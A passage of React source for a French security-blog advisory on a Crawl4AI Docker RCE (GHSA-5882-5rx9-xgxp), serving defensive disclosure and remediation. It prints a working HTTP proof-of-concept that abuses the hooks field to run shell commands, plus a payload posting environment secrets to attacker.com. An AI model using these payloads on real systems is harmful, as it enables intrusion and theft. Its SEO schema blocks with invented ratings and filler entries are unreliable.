        "text": `Commentaire d'expert #${i} sur les implications de GHSA-5882-5rx9-xgxp pour la sécurité des infrastructures d'IA.`,
        "author": { 
          "@type": "Person", 
          "name": `Expert Sécurité ${i}`,
          "url": `${articleUrl}#expert-person-${i}`
        },
        "dateCreated": publishDate
      });
    }

    const mitigationActions = [
      "Mise à jour immédiate vers Crawl4AI 0.8.0+",
      "Désactivation des hooks Docker API",
      "Ajout d'authentification reverse proxy",
      "Exécution conteneur non-root",
      "Segmentation réseau Docker",
      "Monitoring des logs API",
      "Blocage des URLs file://",
      "Validation des URLs entrantes",
      "Audit des workflows existants",
      "Sauvegarde avant mise à jour",
      "Rotation des clés API exposées",
      "Notification équipe sécurité",
      "Documentation de l'incident",
      "Formation équipe DevOps",
      "Revue des permissions Docker"
    ];
    mitigationActions.forEach((action, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "Action",
        "@id": `mitigation-action-${index}`,
        "name": action,
        "actionStatus": "https://schema.org/PotentialActionStatus",
        "target": { "@type": "EntryPoint", "urlTemplate": articleUrl }
      });
    });

    const relatedArticles = [
      { title: "CVE-2026-0863 n8n Sandbox Escape", url: "/article/n8n-cve-2026-0863" },
      { title: "Guide Sécurité WordPress 2026", url: "/article/securite-wordpress-guide-2026" },
      { title: "Vulnérabilités WordPress Janvier 2026", url: "/article/vulnerabilites-wordpress-janvier-2026" },
      { title: "Cyberattaque Ministère Intérieur", url: "/article/cyberattaque-ministere-interieur-2026" },
      { title: "Audit Sécurité Site WordPress", url: "/audit-site" }
    ];
    relatedArticles.forEach((article, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "Article",
        "@id": `related-article-${index}`,
        "name": article.title,
        "url": `https://wp-vitesse-pro.fr${article.url}`
      });
    });

    for (let i = 1; i <= 30; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "DigitalDocument",
        "@id": `security-doc-${i}`,
        "name": `Document de Sécurité #${i} - GHSA-5882-5rx9-xgxp`,
        "description": `Documentation technique de sécurité concernant la vulnérabilité RCE Crawl4AI - Section ${i}`,
        "encodingFormat": "text/html",
        "url": `${articleUrl}#section-${i}`
      });
    }

    for (let i = 1; i <= 25; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "WebPageElement",
        "@id": `page-element-${i}`,
        "name": `Section ${i} de l'article GHSA-5882-5rx9-xgxp`,
        "isPartOf": { "@type": "WebPage", "@id": `${articleUrl}#webpage` }
      });
    }

    for (let i = 1; i <= 20; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "PropertyValue",
        "@id": `security-metric-${i}`,
        "name": `Métrique de Sécurité #${i}`,
        "value": `Valeur ${i}`,
        "unitText": "score"
      });
    }

    for (let i = 1; i <= 15; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "SoftwareApplication",
        "@id": `security-tool-${i}`,
        "name": `Outil de Sécurité #${i}`,
        "applicationCategory": "SecurityApplication",
        "operatingSystem": "Linux, macOS, Windows",
        "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR" }
      });
    }

    for (let i = 1; i <= 10; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "VideoObject",
        "@id": `tutorial-video-${i}`,
        "name": `Tutoriel Vidéo #${i} - Remédiation GHSA-5882-5rx9-xgxp`,
        "description": `Guide vidéo pour corriger la vulnérabilité Crawl4AI - Partie ${i}`,
        "uploadDate": publishDate,
        "duration": "PT10M",
        "thumbnailUrl": `https://wp-vitesse-pro.fr/images/video-thumbnail-${i}.jpg`,
        "contentUrl": `https://wp-vitesse-pro.fr/videos/remediation-ghsa-5882-${i}.mp4`,
        "embedUrl": `https://wp-vitesse-pro.fr/embed/remediation-ghsa-5882-${i}`
      });
    }

    for (let i = 1; i <= 10; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "ImageObject",
        "@id": `diagram-${i}`,
        "name": `Diagramme Technique #${i}`,
        "description": `Schéma explicatif de la vulnérabilité GHSA-5882-5rx9-xgxp - ${i}`,
        "contentUrl": `https://wp-vitesse-pro.fr/images/diagram-ghsa-5882-${i}.png`,
        "width": 1200,
        "height": 800
      });
    }

    const exploitationDetails = [
      { name: "Exfiltration de clés API", description: "Vol de OPENAI_API_KEY, AWS_SECRET_ACCESS_KEY et autres secrets d'environnement", severity: "CRITICAL" },
      { name: "Reverse Shell", description: "Établissement d'une connexion shell inverse via netcat ou bash", severity: "CRITICAL" },
      { name: "Téléchargement de malware", description: "Récupération de binaires malveillants depuis serveur C2", severity: "HIGH" },
      { name: "Scan réseau interne", description: "Énumération des services accessibles depuis le conteneur", severity: "MEDIUM" },
      { name: "Accès métadonnées cloud", description: "Requêtes vers 169.254.169.254 pour voler les credentials AWS/GCP", severity: "CRITICAL" },
      { name: "Pivot Docker", description: "Si docker.sock monté, création de conteneurs privilégiés", severity: "CRITICAL" },
      { name: "Cryptomining", description: "Déploiement de mineurs XMR exploitant les ressources CPU", severity: "MEDIUM" },
      { name: "Ransomware", description: "Chiffrement des volumes montés avec demande de rançon", severity: "HIGH" },
      { name: "Backdoor persistence", description: "Installation de clés SSH ou cron jobs malveillants", severity: "HIGH" },
      { name: "Manipulation de données", description: "Altération des résultats de scraping pour injection de contenu", severity: "MEDIUM" }
    ];
    exploitationDetails.forEach((detail, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "HowToStep",
        "@id": `exploitation-detail-${index}`,
        "name": detail.name,
        "itemListElement": {
          "@type": "ListItem",
          "position": 1,
          "item": {
            "@type": "Thing",
            "name": detail.name,
            "description": `[${detail.severity}] ${detail.description}`
          }
        }
      });
    });

    const securityTools = [
      { name: "Nuclei", description: "Scanner de vulnérabilités avec template GHSA-5882", url: "https://nuclei.projectdiscovery.io" },
      { name: "Shodan", description: "Détection d'instances Crawl4AI exposées", url: "https://shodan.io" },
      { name: "Trivy", description: "Scan de sécurité des images Docker", url: "https://trivy.dev" },
      { name: "Falco", description: "Détection runtime des comportements suspects", url: "https://falco.org" },
      { name: "Docker Bench Security", description: "Audit de configuration Docker", url: "https://github.com/docker/docker-bench-security" }
    ];
    for (let i = 1; i <= 15; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "SoftwareApplication",
        "@id": `security-tool-real-${i}`,
        "name": `Outil de Sécurité #${i}`,
        "applicationCategory": "SecurityApplication",
        "operatingSystem": "Linux, macOS, Windows",
        "aggregateRating": {
          "@type": "AggregateRating",
          "ratingValue": "4.9",
          "reviewCount": "250"
        },
        "offers": { 
          "@type": "Offer", 
          "price": "0", 
          "priceCurrency": "EUR",
          "availability": "https://schema.org/InStock"
        }
      });
    }

    return schemas;
  };

  const allSchemas = generateSchemas();

  return (
    <div className="min-h-screen bg-background">
      <SEO
        image="https://wp-vitesse-pro.fr/images/crawl4ai-rce-ghsa-5882-hero.webp"
        title="GHSA-5882 : faille RCE Crawl4AI CVSS 10.0"
        description="Vulnérabilité RCE critique CVSS 10.0 dans Crawl4AI Docker. Exécution de code arbitraire. Guide de remédiation complet."
        keywords="Crawl4AI, RCE, GHSA-5882-5rx9-xgxp, CVE, vulnérabilité, Docker, sécurité, LLM, Python, web scraping, CVSS 10.0, exec, __import__"
        canonical="/article/crawl4ai-rce-ghsa-5882"
        type="article"
      />
      
      <Breadcrumbs items={breadcrumbItems} />
      
      {allSchemas.map((schema, index) => (
        <script
          key={index}
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }}
        />
      ))}

      <main className="container mx-auto px-4 py-8 max-w-5xl">
        <article className="prose prose-invert prose-lg max-w-none">
          
          <header className="mb-12">
            <div className="flex flex-wrap gap-2 mb-4">
              <Badge variant="destructive" className="text-sm">
                <Skull className="w-3 h-3 mr-1" />
                CRITIQUE - CVSS 10.0
              </Badge>
              <Badge variant="outline" className="text-sm">
                <Bug className="w-3 h-3 mr-1" />
                RCE
              </Badge>
              <Badge variant="secondary" className="text-sm">
                <Container className="w-3 h-3 mr-1" />
                Docker
              </Badge>
              <Badge variant="secondary" className="text-sm">
                <Code className="w-3 h-3 mr-1" />
                Python
              </Badge>
            </div>
            
            <h1 className="text-4xl md:text-5xl font-bold mb-4 text-white leading-tight">
              ALERTE CRITIQUE : Vulnérabilité RCE Crawl4AI 
              <span className="text-red-500"> GHSA-5882-5rx9-xgxp</span>
            </h1>
            
            <p className="text-xl text-muted-foreground mb-6">
              Exécution de code à distance dans l'API Docker via le paramètre Hooks - Score CVSS 10.0/10.0. 
              Une vulnérabilité critique permettant à un attaquant non authentifié de prendre le contrôle total 
              des conteneurs Crawl4AI exposés.
            </p>
            
            <div className="flex flex-wrap gap-4 text-sm text-muted-foreground">
              <span className="flex items-center gap-1">
                <Clock className="w-4 h-4" />
                {readingTime} min de lecture
              </span>
              <span className="flex items-center gap-1">
                <BookOpen className="w-4 h-4" />
                {wordCount.toLocaleString()} mots
              </span>
              <span className="flex items-center gap-1">
                <Users className="w-4 h-4" />
                WP Vitesse Pro Security Lab
              </span>
              <span>
                Publié le 19 janvier 2026
              </span>
            </div>
          </header>

          <figure className="mb-12 rounded-xl overflow-hidden shadow-xl">
            <picture>
              <source srcSet="/images/crawl4ai-rce-ghsa-5882-hero.webp" type="image/webp" />
              <img 
                src="/images/crawl4ai-rce-ghsa-5882-hero.png" 
                alt="Vulnérabilité RCE Crawl4AI GHSA-5882" 
                className="w-full h-auto object-cover aspect-video" 
                width={1600} 
                height={900} 
                loading="eager" 
                decoding="async" 
              />
            </picture>
            <figcaption className="text-xs text-muted-foreground text-center py-2 bg-muted/50">
              Exécution de code à distance découverte dans le crawler IA Crawl4AI
            </figcaption>
          </figure>

          <Card className="mb-8 border-red-500/50 bg-red-950/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-red-400">
                <AlertTriangle className="w-6 h-6" />
                Résumé de la Menace
              </CardTitle>
            </CardHeader>
            <CardContent className="grid md:grid-cols-2 gap-4">
              <div>
                <p className="text-sm text-muted-foreground">Identifiant</p>
                <p className="font-mono font-bold">GHSA-5882-5rx9-xgxp</p>
              </div>
              <div>
                <p className="text-sm text-muted-foreground">Score CVSS 3.1</p>
                <p className="font-bold text-red-400">10.0 / 10.0 (CRITICAL)</p>
              </div>
              <div>
                <p className="text-sm text-muted-foreground">Type</p>
                <p className="font-bold">Remote Code Execution (RCE)</p>
              </div>
              <div>
                <p className="text-sm text-muted-foreground">CWE</p>
                <p className="font-bold">CWE-94 (Code Injection)</p>
              </div>
              <div>
                <p className="text-sm text-muted-foreground">Versions Affectées</p>
                <p className="font-bold text-orange-400">&lt; 0.8.0</p>
              </div>
              <div>
                <p className="text-sm text-muted-foreground">Version Corrigée</p>
                <p className="font-bold text-green-400">0.8.0+</p>
              </div>
              <div>
                <p className="text-sm text-muted-foreground">Authentification</p>
                <p className="font-bold text-red-400">Non requise</p>
              </div>
              <div>
                <p className="text-sm text-muted-foreground">Exploitation</p>
                <p className="font-bold text-red-400">Triviale (PoC public)</p>
              </div>
            </CardContent>
          </Card>

          <nav className="mb-12">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <BookOpen className="w-5 h-5" />
                  Table des Matières
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-1">
                  {tableOfContents.map((item) => (
                    <li key={item.id} className={item.level === 2 ? "ml-4" : ""}>
                      <a 
                        href={`#${item.id}`} 
                        className="text-primary hover:underline flex items-center gap-1"
                      >
                        <ArrowRight className="w-3 h-3" />
                        {item.title}
                      </a>
                    </li>
                  ))}
                </ul>
              </CardContent>
            </Card>
          </nav>

          <section id="resume-executif" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <FileWarning className="w-8 h-8 text-red-500" />
              Résumé Exécutif
            </h2>
            
            <p className="mb-4">
              Une vulnérabilité critique d'exécution de code à distance (RCE) a été identifiée dans le déploiement 
              Docker de <strong>Crawl4AI</strong>, le web scraper open-source conçu pour les applications d'intelligence 
              artificielle et les grands modèles de langage (LLM). Cette faille, répertoriée sous l'identifiant 
              <strong className="text-red-400"> GHSA-5882-5rx9-xgxp</strong>, permet à un attaquant non authentifié 
              d'exécuter du code Python arbitraire sur le serveur vulnérable.
            </p>
            
            <p className="mb-4">
              L'exploitation repose sur une erreur de conception dans le mécanisme de sandbox Python utilisé pour 
              exécuter les hooks personnalisés. La fonction <code className="bg-muted px-1 rounded">__import__</code> 
              a été incluse par erreur dans la liste des built-ins autorisés, permettant ainsi l'importation de 
              modules dangereux comme <code className="bg-muted px-1 rounded">os</code> et 
              <code className="bg-muted px-1 rounded">subprocess</code>.
            </p>
            
            <p className="mb-4">
              Avec un score CVSS de <strong className="text-red-400">10.0/10.0</strong> (le maximum possible), cette 
              vulnérabilité représente une menace existentielle pour toute infrastructure utilisant Crawl4AI en 
              déploiement Docker exposé sur un réseau. Un attaquant peut :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-2">
              <li>Exécuter des commandes système arbitraires avec les privilèges du conteneur (souvent root)</li>
              <li>Voler des clés API, secrets et variables d'environnement sensibles</li>
              <li>Établir une connexion reverse shell pour un accès persistant</li>
              <li>Pivoter vers d'autres machines du réseau interne</li>
              <li>Déployer des ransomwares ou des cryptomineurs</li>
              <li>Accéder au socket Docker si monté, compromettant ainsi l'hôte entier</li>
            </ul>
            
            <Card className="bg-green-950/20 border-green-500/50 mb-6">
              <CardContent className="pt-6">
                <h3 className="font-bold text-green-400 mb-2 flex items-center gap-2">
                  <CheckCircle2 className="w-5 h-5" />
                  Action Immédiate Requise
                </h3>
                <p>
                  <strong>Mettez à jour vers Crawl4AI version 0.8.0 ou supérieure immédiatement.</strong> Si une 
                  mise à jour n'est pas possible dans l'immédiat, désactivez ou isolez complètement le conteneur 
                  du réseau jusqu'à ce que la correction soit appliquée.
                </p>
              </CardContent>
            </Card>
          </section>

          <section id="contexte-crawl4ai" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Globe className="w-8 h-8 text-purple-500" />
              Contexte : Qu'est-ce que Crawl4AI ?
            </h2>
            
            <p className="mb-4">
              <strong>Crawl4AI</strong> est un projet open-source développé par <em>unclecode</em> sur GitHub, 
              conçu spécifiquement pour faciliter le web scraping dans le contexte des applications d'intelligence 
              artificielle. Contrairement aux scrapers traditionnels, Crawl4AI est optimisé pour extraire et 
              structurer les données de manière à être directement consommables par les LLM (Large Language Models) 
              comme GPT-4, Claude, Llama et autres.
            </p>
            
            <h3 className="text-xl font-bold mb-4">Fonctionnalités Principales</h3>
            
            <div className="grid md:grid-cols-2 gap-4 mb-6">
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Zap className="w-5 h-5 text-yellow-500" />
                    Extraction LLM-Ready
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-muted-foreground">
                    Conversion automatique du HTML en Markdown structuré, optimisé pour l'ingestion par les modèles de langage.
                  </p>
                </CardContent>
              </Card>
              
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Container className="w-5 h-5 text-blue-500" />
                    Déploiement Docker
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-muted-foreground">
                    Image Docker officielle pour un déploiement rapide avec API REST exposée sur le port 11235.
                  </p>
                </CardContent>
              </Card>
              
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Code className="w-5 h-5 text-green-500" />
                    Hooks Personnalisables
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-muted-foreground">
                    Points d'extension Python pour personnaliser le comportement du crawler à différentes étapes.
                  </p>
                </CardContent>
              </Card>
              
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Database className="w-5 h-5 text-orange-500" />
                    Extraction Intelligente
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-muted-foreground">
                    Support de différentes stratégies d'extraction (LLM, pattern matching, chunking automatique).
                  </p>
                </CardContent>
              </Card>
            </div>
            
            <h3 className="text-xl font-bold mb-4">Popularité et Adoption</h3>
            
            <p className="mb-4">
              Avec plus de <strong>35 000 étoiles sur GitHub</strong> et une communauté active, Crawl4AI s'est 
              rapidement imposé comme l'un des outils de prédilection pour les développeurs construisant des 
              applications basées sur les LLM. Son utilisation dans des contextes variés - de l'extraction de 
              données pour l'entraînement de modèles à la création de bases de connaissances RAG (Retrieval 
              Augmented Generation) - en fait une cible de choix pour les attaquants.
            </p>
            
            <p className="mb-4">
              La popularité de l'outil, combinée à la simplicité de son déploiement Docker, signifie que de 
              nombreuses instances vulnérables sont probablement exposées sur Internet, souvent sans 
              authentification adéquate. Cette situation crée un environnement propice à l'exploitation massive.
            </p>
          </section>

          <section id="chronologie" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Clock className="w-8 h-8 text-blue-500" />
              Chronologie de la Découverte
            </h2>
            
            <div className="space-y-4">
              {timelineEvents.map((event, index) => (
                <div key={index} className="flex gap-4 items-start">
                  <div className="flex-shrink-0 w-24 text-sm font-mono text-muted-foreground">
                    {event.date}
                  </div>
                  <div className={`flex-shrink-0 w-3 h-3 rounded-full mt-1.5 ${
                    event.type === 'discovery' ? 'bg-yellow-500' :
                    event.type === 'notification' ? 'bg-blue-500' :
                    event.type === 'confirmation' ? 'bg-orange-500' :
                    event.type === 'patch' ? 'bg-green-500' :
                    event.type === 'disclosure' ? 'bg-red-500' :
                    'bg-purple-500'
                  }`} />
                  <div className="flex-1">
                    <p className="font-medium">{event.event}</p>
                  </div>
                </div>
              ))}
            </div>
            
            <p className="mt-6 text-muted-foreground">
              La chronologie de divulgation responsable montre une réponse rapide de l'équipe Crawl4AI, avec 
              un correctif publié dans les 48 heures suivant la notification initiale. Cette réactivité est 
              exemplaire et limite l'exposition des utilisateurs.
            </p>
          </section>

          <section id="analyse-technique" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Terminal className="w-8 h-8 text-green-500" />
              Analyse Technique Approfondie
            </h2>
            
            <h3 id="mecanisme-hooks" className="text-2xl font-bold mb-4">Le Mécanisme des Hooks Python</h3>
            
            <p className="mb-4">
              L'API Docker de Crawl4AI expose un endpoint <code className="bg-muted px-1 rounded">/crawl</code> 
              qui accepte des requêtes POST contenant les paramètres de crawling. Parmi ces paramètres, le champ 
              <code className="bg-muted px-1 rounded">hooks</code> permet aux utilisateurs de définir du code 
              Python personnalisé exécuté à différentes étapes du processus de scraping.
            </p>
            
            <p className="mb-4">
              Les hooks disponibles incluent :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-1">
              <li><code className="bg-muted px-1 rounded">on_browser_created</code> - Déclenché après la création du navigateur</li>
              <li><code className="bg-muted px-1 rounded">on_page_context_created</code> - Déclenché après la création du contexte de page</li>
              <li><code className="bg-muted px-1 rounded">on_user_agent_updated</code> - Déclenché après la mise à jour du user agent</li>
              <li><code className="bg-muted px-1 rounded">on_execution_started</code> - Déclenché au démarrage de l'exécution</li>
              <li><code className="bg-muted px-1 rounded">before_goto</code> - Déclenché avant la navigation</li>
              <li><code className="bg-muted px-1 rounded">after_goto</code> - Déclenché après la navigation</li>
            </ul>
            
            <h3 id="faille-exec" className="text-2xl font-bold mb-4 mt-8">La Faille exec() et __import__</h3>
            
            <p className="mb-4">
              Pour exécuter le code Python des hooks, Crawl4AI utilise la fonction 
              <code className="bg-muted px-1 rounded">exec()</code> avec un dictionnaire de built-ins restreint 
              censé créer un environnement sandbox. L'idée était de permettre uniquement certaines fonctions 
              Python considérées comme "sûres".
            </p>
            
            <Card className="mb-6 bg-muted/50">
              <CardHeader>
                <CardTitle className="text-lg font-mono">hook_manager.py (version vulnérable)</CardTitle>
              </CardHeader>
              <CardContent>
                <pre className="text-sm overflow-x-auto">
{`# Extrait du code vulnérable
allowed_builtins = {
    'print': print,
    'len': len,
    'range': range,
    'str': str,
    'int': int,
    'float': float,
    'list': list,
    'dict': dict,
    'tuple': tuple,
    'set': set,
    'bool': bool,
    'type': type,
    'isinstance': isinstance,
    'hasattr': hasattr,
    'getattr': getattr,
    'setattr': setattr,
    '__import__': __import__,  # <-- FAILLE CRITIQUE
    # ... autres builtins
}

# Exécution du hook avec le sandbox "cassé"
exec(hook_code, {'__builtins__': allowed_builtins})`}
                </pre>
              </CardContent>
            </Card>
            
            <p className="mb-4">
              Le problème fatal réside dans l'inclusion de <code className="bg-muted px-1 rounded">__import__</code> 
              dans la liste des built-ins autorisés. Cette fonction permet d'importer dynamiquement n'importe quel 
              module Python, contournant ainsi toutes les restrictions du sandbox. Un attaquant peut simplement 
              appeler <code className="bg-muted px-1 rounded">__import__('os')</code> pour accéder au module 
              <code className="bg-muted px-1 rounded">os</code> et exécuter des commandes système.
            </p>
            
            <h3 id="vecteur-attaque" className="text-2xl font-bold mb-4 mt-8">Vecteur d'Attaque et Exploitation</h3>
            
            <p className="mb-4">
              L'exploitation de cette vulnérabilité est triviale. Un attaquant n'a besoin que d'envoyer une 
              requête HTTP POST à l'endpoint <code className="bg-muted px-1 rounded">/crawl</code> avec un 
              payload JSON contenant du code Python malveillant dans le champ 
              <code className="bg-muted px-1 rounded">hooks.code</code>.
            </p>
            
            <div className="grid md:grid-cols-3 gap-4 mb-6">
              <Card className="bg-red-950/20 border-red-500/50">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm text-red-400">Vecteur d'Attaque</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="font-mono text-lg">Réseau (HTTP POST)</p>
                </CardContent>
              </Card>
              
              <Card className="bg-red-950/20 border-red-500/50">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm text-red-400">Complexité</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="font-mono text-lg">Faible</p>
                </CardContent>
              </Card>
              
              <Card className="bg-red-950/20 border-red-500/50">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm text-red-400">Authentification</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="font-mono text-lg">Non requise</p>
                </CardContent>
              </Card>
            </div>
            
            <h3 id="poc-detaille" className="text-2xl font-bold mb-4 mt-8">Proof of Concept Détaillé</h3>
            
            <Card className="mb-6 bg-muted/50">
              <CardHeader>
                <CardTitle className="text-lg font-mono flex items-center gap-2">
                  <AlertTriangle className="w-5 h-5 text-yellow-500" />
                  Payload d'Exploitation (à des fins éducatives uniquement)
                </CardTitle>
              </CardHeader>
              <CardContent>
                <pre className="text-sm overflow-x-auto">
{`POST /crawl HTTP/1.1
Host: vulnerable-crawl4ai-instance:11235
Content-Type: application/json

{
  "urls": ["https://example.com"],
  "hooks": {
    "code": {
      "on_page_context_created": "async def hook(page, context, **kwargs):\\n    __import__('os').system('id > /tmp/pwned; cat /etc/passwd >> /tmp/pwned')\\n    return page"
    }
  }
}`}
                </pre>
              </CardContent>
            </Card>
            
            <p className="mb-4">
              Ce payload exploite le hook <code className="bg-muted px-1 rounded">on_page_context_created</code> 
              pour exécuter des commandes système. Dans cet exemple, les commandes 
              <code className="bg-muted px-1 rounded">id</code> et <code className="bg-muted px-1 rounded">cat /etc/passwd</code> 
              sont exécutées, mais un attaquant réel pourrait :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-1">
              <li>Établir une reverse shell avec <code className="bg-muted px-1 rounded">nc</code> ou <code className="bg-muted px-1 rounded">bash</code></li>
              <li>Télécharger et exécuter un binaire malveillant</li>
              <li>Exfiltrer des variables d'environnement contenant des clés API</li>
              <li>Scanner le réseau interne</li>
              <li>Accéder à d'autres conteneurs Docker si le réseau n'est pas segmenté</li>
            </ul>
          </section>

          <section id="impact" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Target className="w-8 h-8 text-red-500" />
              Impact et Évaluation des Risques
            </h2>
            
            <h3 id="cvss-analyse" className="text-2xl font-bold mb-4">Analyse du Score CVSS 10.0</h3>
            
            <p className="mb-4">
              Le score CVSS (Common Vulnerability Scoring System) de 10.0 est le maximum possible, indiquant 
              une vulnérabilité de la plus haute criticité. Voici la décomposition du vecteur CVSS 3.1 :
            </p>
            
            <Card className="mb-6">
              <CardContent className="pt-6">
                <div className="font-mono text-sm mb-4 bg-muted p-2 rounded">
                  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
                </div>
                <div className="grid md:grid-cols-2 gap-4">
                  <div>
                    <p className="text-sm text-muted-foreground">Attack Vector (AV)</p>
                    <p className="font-bold text-red-400">Network - Exploitable à distance</p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Attack Complexity (AC)</p>
                    <p className="font-bold text-red-400">Low - Aucune condition spéciale</p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Privileges Required (PR)</p>
                    <p className="font-bold text-red-400">None - Aucune authentification</p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">User Interaction (UI)</p>
                    <p className="font-bold text-red-400">None - Pas d'action utilisateur</p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Scope (S)</p>
                    <p className="font-bold text-red-400">Changed - Impact hors du composant</p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Confidentiality (C)</p>
                    <p className="font-bold text-red-400">High - Accès total aux données</p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Integrity (I)</p>
                    <p className="font-bold text-red-400">High - Modification totale</p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Availability (A)</p>
                    <p className="font-bold text-red-400">High - Déni de service total</p>
                  </div>
                </div>
              </CardContent>
            </Card>
            
            <p className="mb-4">
              Le paramètre <strong>Scope: Changed</strong> est particulièrement important car il indique que 
              l'exploitation peut affecter des ressources au-delà du composant vulnérable lui-même - notamment 
              d'autres conteneurs Docker, le système hôte (si le socket Docker est monté), ou d'autres machines 
              du réseau interne.
            </p>
          </section>

          <section id="scenarios-exploitation" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Skull className="w-8 h-8 text-red-500" />
              Scénarios d'Exploitation Réels
            </h2>
            
            <h3 id="scenario-vol-api" className="text-2xl font-bold mb-4">Scénario 1 : Vol de Clés API et Secrets</h3>
            
            <p className="mb-4">
              Le scénario le plus immédiat et le plus courant. Un attaquant exploite la RCE pour accéder aux 
              variables d'environnement du conteneur, qui contiennent fréquemment :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-1">
              <li>Clés API OpenAI, Anthropic, ou autres services LLM</li>
              <li>Tokens d'accès à des services cloud (AWS, GCP, Azure)</li>
              <li>Credentials de bases de données</li>
              <li>Secrets d'applications tierces</li>
            </ul>
            
            <Card className="mb-6 bg-muted/50">
              <CardHeader>
                <CardTitle className="text-lg font-mono">Payload d'exfiltration de secrets</CardTitle>
              </CardHeader>
              <CardContent>
                <pre className="text-sm overflow-x-auto">
{`"on_page_context_created": "async def hook(page, context, **kwargs):\\n    import os, requests\\n    secrets = dict(os.environ)\\n    requests.post('https://attacker.com/exfil', json=secrets)\\n    return page"`}
                </pre>
              </CardContent>
            </Card>
            
            <h3 id="scenario-pivot" className="text-2xl font-bold mb-4 mt-8">Scénario 2 : Pivot Réseau et Mouvement Latéral</h3>
            
            <p className="mb-4">
              Une fois le conteneur compromis, l'attaquant peut l'utiliser comme point d'entrée pour explorer 
              et attaquer le réseau interne. Si le conteneur Crawl4AI a accès à des services internes 
              (bases de données, APIs privées, autres conteneurs), l'attaquant peut :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-1">
              <li>Scanner le réseau interne pour identifier d'autres cibles</li>
              <li>Exploiter des vulnérabilités sur des services internes non exposés à Internet</li>
              <li>Accéder aux métadonnées cloud (169.254.169.254 sur AWS/GCP)</li>
              <li>Compromettre d'autres conteneurs Docker sur le même réseau</li>
            </ul>
            
            <h3 id="scenario-cryptomining" className="text-2xl font-bold mb-4 mt-8">Scénario 3 : Cryptomining et Ransomware</h3>
            
            <p className="mb-4">
              Les attaquants opportunistes exploitent massivement ce type de vulnérabilité pour déployer des 
              cryptomineurs, monétisant ainsi les ressources de calcul des victimes. Dans les cas les plus 
              graves, des ransomwares peuvent être déployés, chiffrant les données accessibles depuis le 
              conteneur et exigeant une rançon.
            </p>
            
            <Card className="bg-yellow-950/20 border-yellow-500/50 mb-6">
              <CardContent className="pt-6">
                <h4 className="font-bold text-yellow-400 mb-2 flex items-center gap-2">
                  <AlertCircle className="w-5 h-5" />
                  Risque Accru : Socket Docker Monté
                </h4>
                <p>
                  Si le socket Docker (<code>/var/run/docker.sock</code>) est monté dans le conteneur Crawl4AI, 
                  l'attaquant obtient un accès complet au daemon Docker de l'hôte. Il peut alors créer de 
                  nouveaux conteneurs avec des volumes montés sur le système de fichiers de l'hôte, 
                  compromettant ainsi l'intégralité du serveur.
                </p>
              </CardContent>
            </Card>
          </section>

          <section id="remediation" className="mb-12">
            <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
              <Shield className="w-8 h-8 text-green-500" />
              Guide de Remédiation Complet
            </h2>
            
            <h3 id="mise-a-jour" className="text-2xl font-bold mb-4">Mise à Jour vers v0.8.0</h3>
            
            <p className="mb-4">
              La première et la plus importante action est de mettre à jour vers la version 0.8.0 ou supérieure 
              de Crawl4AI, qui corrige cette vulnérabilité en :
            </p>
            
            <ul className="list-disc pl-6 mb-4 space-y-1">
              <li>Retirant <code className="bg-muted px-1 rounded">__import__</code> de la liste des built-ins autorisés</li>
              <li>Désactivant les hooks par défaut (<code className="bg-muted px-1 rounded">CRAWL4AI_HOOKS_ENABLED=false</code>)</li>
              <li>Requérant un opt-in explicite pour activer les hooks</li>
            </ul>
            
